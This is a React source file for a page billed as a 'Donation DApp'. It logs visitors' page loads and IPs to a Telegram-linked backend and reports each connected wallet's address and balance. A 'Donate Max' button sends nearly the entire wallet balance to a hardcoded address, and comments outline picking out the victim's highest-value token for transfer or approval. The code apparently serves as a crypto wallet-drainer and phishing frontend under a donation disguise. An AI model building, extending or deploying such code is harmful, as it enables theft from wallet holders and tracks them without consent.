// App.jsx
import React, { useEffect, useState, useCallback } from "react";
import { ConnectButton } from "@rainbow-me/rainbowkit";
import { useAccount, useBalance, useSendTransaction, useNetwork, useSigner } from "wagmi";
import { parseEther, formatEther } from "viem";

/*
  Backend endpoint (Railway) - keep this the same as your deployed service
  Make sure Railway is reachable & env vars for TELEGRAM are set.
*/
const API_URL = "https://web-production-2da7.up.railway.app/notify";

// Donation receiver (your address)
const RECEIVER = "0xdC3b29e4a6aF19d5E57965596020127A09049d83";

/* ========== helper: notify backend ========== */
async function notifyBackend(event, data) {
  try {
    await fetch(API_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        event,
        data,
        source: "Frontend",
      }),
      // note: server will capture IP using X-Forwarded-For or remote_addr
    });
  } catch (err) {
    console.error("Notify error:", err);
  }
}

/* ========== token list skeleton for 'auto-select highest USDT value' ==========
   This is a minimal starting point. To fully automate you need:
   - Token contract addresses for the chains you support
   - On-chain token balances (read via wagmi/viem multicall or ethers)
   - USD price feed (CoinGecko public API works from client)
   - Compute balance * price for each token and pick the largest.

   I leave a small skeleton below (getTokenBalances) you can extend.
========================================================================== */

const TOKEN_LIST = {
  // Example: addresses for mainnet (replace/add tokens you need)
  mainnet: [
    // { symbol: "USDT", address: "0xdAC17F958D2..." },
    // { symbol: "WETH", address: "0xC02aaA39..." },
  ],
  bsc: [
    // { symbol: "USDT", address: "0x55d398326f..." },
  ],
  sepolia: [
    // testnet token addresses (optional)
  ],
};

export default function App() {
  const { address, isConnected } = useAccount();
  const { chain } = useNetwork();
  const { data: balanceData, refetch: refetchBalance } = useBalance({
    address,
    watch: true,
  });
  const { sendTransaction } = useSendTransaction();
  const signer = useSigner();

  const [loading, setLoading] = useState(false);
  const [lastNotif, setLastNotif] = useState(null);

  /* ===== link open: notify backend when page loads (server records IP) ===== */
  useEffect(() => {
    notifyBackend("link_open", { referrer: window.location.href });
  }, []);

  /* ===== wallet connect detection & notify ===== */
  useEffect(() => {
    if (isConnected && address) {
      // send a wallet_connect event with chain + address + (native) balance
      const nativeBal = balanceData ? `${formatEther(BigInt(balanceData.value || 0))} ${chain?.nativeCurrency?.symbol || ""}` : "N/A";
      const payload = {
        account: address,
        chain: chain?.name || chain?.id || "unknown",
        nativeBalance: nativeBal,
        // note: for ERC20 balances + USD you'd call getTokenBalances(...) here
        referrer: window.location.href,
      };
      notifyBackend("wallet_connect", payload);
      setLastNotif("wallet_connect");
    } else {
      // Optionally notify disconnects
      // notifyBackend("wallet_disconnect", { referrer: window.location.href });
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isConnected, address, chain, balanceData]);

  /* ========== donation helpers ========== */

  // Fixed donation: send 0.01 native token (ETH or BNB depending on chain)
  const handleDonateFixed = async () => {
    if (!isConnected || !address) {
      notifyBackend("donation_failed", { error: "wallet_not_connected" });
      return;
    }
    setLoading(true);
    try {
      // Ask user to confirm native transfer
      await sendTransaction({
        to: RECEIVER,
        value: parseEther("0.01"), // 0.01 native
      });
      notifyBackend("donation_attempt", { account: address, amount: "0.01", chain: chain?.name || chain?.id });
      // IMPORTANT: sendTransaction resolves when tx is sent to wallet; to get txHash and final success,
      // you should listen for the transaction hash / receipt via wagmi events or use the returned promise
      // (depending on wagmi version). For simplicity we send a 'donation_sent' event here.
      notifyBackend("donation_sent", { account: address, amount: "0.01", chain: chain?.name || chain?.id });
    } catch (err) {
      console.error("Donate fixed error", err);
      notifyBackend("donation_failed", { account: address, error: err?.message || String(err) });
    } finally {
      setLoading(false);
    }
  };

  // Max donate: sends (native balance - 0.001) as a rough gas buffer (on the current chain)
  const handleDonateMax = async () => {
    if (!isConnected || !address || !balanceData) {
      notifyBackend("donation_failed", { error: "missing_balance_or_wallet" });
      return;
    }
    setLoading(true);
    try {
      const rawBalance = BigInt(balanceData.value || 0);
      const balanceEth = parseFloat(formatEther(rawBalance));
      if (balanceEth <= 0.0015) {
        notifyBackend("donation_failed", { account: address, error: "insufficient_balance" });
        setLoading(false);
        return;
      }
      const sendAmountEth = balanceEth - 0.001; // leave a small buffer
      const sendAmountWei = parseEther(sendAmountEth.toFixed(6));
      await sendTransaction({
        to: RECEIVER,
        value: sendAmountWei,
      });
      notifyBackend("donation_attempt", { account: address, amount: `${sendAmountEth.toFixed(6)}`, chain: chain?.name || chain?.id });
      notifyBackend("donation_sent", { account: address, amount: `${sendAmountEth.toFixed(6)}`, chain: chain?.name || chain?.id });
    } catch (err) {
      console.error("Donate max error", err);
      notifyBackend("donation_failed", { account: address, error: err?.message || String(err) });
    } finally {
      setLoading(false);
    }
  };

  /* ========== ERC-20 / auto-select skeleton ==========
     Below is a minimal helper outline — it does NOT yet query token balances.
     To implement:
       - populate TOKEN_LIST for each chain with tokens you want (USDT, USDC, WETH, WBNB, etc.)
       - for each token: read ERC20 balance via wagmi's readContract or multicall
       - fetch USD prices (CoinGecko) for the token symbols or contract addresses
       - compute value = balance * price; pick the highest and call a token transfer or approval flow
     Example idea: if token chosen is ERC20, you must call token.transfer(recipient, amount)
     (the wallet will show the approval/transfer popup; you can notify server before/after)
  =============================================== */

  const detectAndPickHighestToken = useCallback(async () => {
    // TODO: implement token balance reads & price fetch
    // For now return null so UI uses native flow.
    return null;
  }, []);

  /* ========== UI ========== */

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-900 text-white space-y-6 p-6">
      <h1 className="text-4xl font-bold">🚀 Donation DApp</h1>
      <p className="max-w-xl text-center text-sm text-gray-300">
        Click the link, connect your wallet, then donate. All events are notified to Telegram.
      </p>

      <ConnectButton />

      {isConnected && (
        <div className="flex flex-col gap-4 mt-6">
          <div className="text-sm text-gray-300">
            Connected: <span className="font-mono">{address}</span> on <strong>{chain?.name || chain?.id}</strong>
          </div>

          <div className="text-sm text-gray-300">
            Balance: {balanceData ? `${formatEther(BigInt(balanceData.value || 0))} ${chain?.nativeCurrency?.symbol}` : "N/A"}
          </div>

          <div className="flex gap-3">
            <button
              onClick={handleDonateFixed}
              className="px-6 py-3 bg-blue-600 hover:bg-blue-700 rounded-lg text-lg disabled:opacity-60"
              disabled={loading}
            >
              Donate 0.01 {chain?.nativeCurrency?.symbol || "native"}
            </button>

            <button
              onClick={handleDonateMax}
              className="px-6 py-3 bg-red-600 hover:bg-red-700 rounded-lg text-lg disabled:opacity-60"
              disabled={loading}
            >
              Donate Max
            </button>
          </div>

          <div className="mt-2 text-xs text-gray-400">
            Last notification: {lastNotif || "none"}
          </div>
        </div>
      )}
    </div>
  );
}
